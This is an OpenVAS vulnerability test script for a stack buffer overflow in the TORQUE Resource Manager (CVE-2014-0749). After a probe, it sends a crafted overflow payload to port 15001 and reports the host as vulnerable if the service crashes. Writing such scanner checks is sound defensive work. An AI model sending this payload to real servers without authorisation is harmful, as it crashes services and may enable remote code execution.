###############################################################################
# OpenVAS Vulnerability Test
#
# TORQUE Resource Manager Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804456");
  script_version("2022-04-14T11:24:11+0000");
  script_cve_id("CVE-2014-0749");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-04-14 11:24:11 +0000 (Thu, 14 Apr 2022)");
  script_tag(name:"creation_date", value:"2014-05-29 14:39:49 +0530 (Thu, 29 May 2014)");
  script_name("TORQUE Resource Manager Stack Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(15001);

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2014/May/75");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67420");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126651");
  script_xref(name:"URL", value:"https://labs.mwrinfosecurity.com/advisories/2014/05/14/torque-buffer-overflow/");

  script_tag(name:"summary", value:"TORQUE Resource Manager is prone to stack buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error within the 'disrsi_()' function
  (src/lib/Libdis/disrsi_.c), which can be exploited to cause a stack-based buffer overflow.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary code
  and cause a denial of service.");

  script_tag(name:"affected", value:"TORQUE versions 2.5 through 2.5.13.");

  script_tag(name:"solution", value:"Upgrade to TORQUE 4.2 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

port = 15001;
if(!get_port_state(port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:"--help");
res = recv(socket:soc, length:1024);
close(soc);

if(!res || "DIS based Request Protocol MSG=cannot decode message" >!< res)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

BadData = raw_string(0x33, 0x31, 0x34, 0x33, 0x31) +
          crap(data: raw_string(0x00), length: 135) +
          raw_string(0xc0, 0x18, 0x76, 0xf7, 0xff,
          0x7f, 0x00, 0x00);
send(socket:soc, data:BadData);
close(soc);

sleep(1);

soc = open_sock_tcp(port);
if(!soc) {
  security_message(port:port);
  exit(0);
}

close(soc);
exit(99);
